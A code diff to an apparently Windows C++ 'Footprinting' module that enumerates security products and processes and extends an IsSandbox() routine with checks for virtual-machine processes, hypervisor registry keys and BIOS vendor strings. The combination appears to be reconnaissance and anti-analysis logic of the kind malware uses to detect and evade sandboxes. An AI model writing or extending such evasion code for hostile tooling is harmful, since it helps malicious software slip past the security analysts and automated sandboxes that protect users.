@@ -6,6 +6,7 @@
 
 #pragma comment(lib, "Netapi32.lib")
 #pragma comment(lib, "User32.lib")
+#pragma comment(lib, "Advapi32.lib")
 
 Footprinting::Footprinting() {}
 
@@ -99,8 +100,7 @@ std::vector<std::string> Footprinting::GetSecurityProducts() {
     return products;
 }
 
-    return products;
-}
+
 
 std::vector<ProcessInfo> Footprinting::GetProcessList() {
     std::vector<ProcessInfo> processList;
@@ -210,9 +210,75 @@ bool Footprinting::IsSandbox() {
 
     // 2. Check CPU Cores (< 2 is suspicious)
     SYSTEM_INFO sysInfo;
-    GetSystemInfo(&sysInfo);
+    ::GetSystemInfo(&sysInfo);
     if (sysInfo.dwNumberOfProcessors < 2) {
         return true;
+    }
+
+    // 3. Check for VM Processes
+    std::vector<std::wstring> vmProcesses = {
+        L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe", 
+        L"vboxservice.exe", L"vboxtray.exe", 
+        L"xenservice.exe", L"prl_cc.exe", L"prl_tools.exe"
+    };
+
+    for (const auto& proc : vmProcesses) {
+        if (IsProcessRunning(proc)) {
+            return true;
+        }
+    }
+
+    // 4. Check Registry Keys (VMware, VirtualBox, Hyper-V)
+    std::vector<std::string> vmRegKeys = {
+        "SOFTWARE\\VMware, Inc.\\VMware Tools",
+        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+        "SYSTEM\\CurrentControlSet\\Services\\vmicguestinterface",
+        "HARDWARE\\ACPI\\DSDT\\VBOX__"
+    };
+
+    for (const auto& key : vmRegKeys) {
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return true;
+        }
+    }
+
+    // 5. Check BIOS Manufacturer/Model
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        char buffer[256];
+        DWORD bufferLen = 256;
+        
+        // Check SystemManufacturer
+        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)buffer, &bufferLen) == ERROR_SUCCESS) {
+            std::string manufacturer(buffer);
+            for(auto& c : manufacturer) c = tolower(c);
+            
+            if (manufacturer.find("vmware") != std::string::npos || 
+                manufacturer.find("virtualbox") != std::string::npos ||
+                manufacturer.find("innotek") != std::string::npos ||
+                manufacturer.find("xen") != std::string::npos ||
+                manufacturer.find("qemu") != std::string::npos) {
+                RegCloseKey(hKey);
+                return true;
+            }
+        }
+
+        // Check SystemProductName
+        bufferLen = 256;
+        if (RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)buffer, &bufferLen) == ERROR_SUCCESS) {
+            std::string product(buffer);
+            for(auto& c : product) c = tolower(c);
+
+            if (product.find("vmware") != std::string::npos || 
+                product.find("virtualbox") != std::string::npos ||
+                product.find("virtual machine") != std::string::npos) {
+                RegCloseKey(hKey);
+                return true;
+            }
+        }
+        RegCloseKey(hKey);
     }
 
     return false;
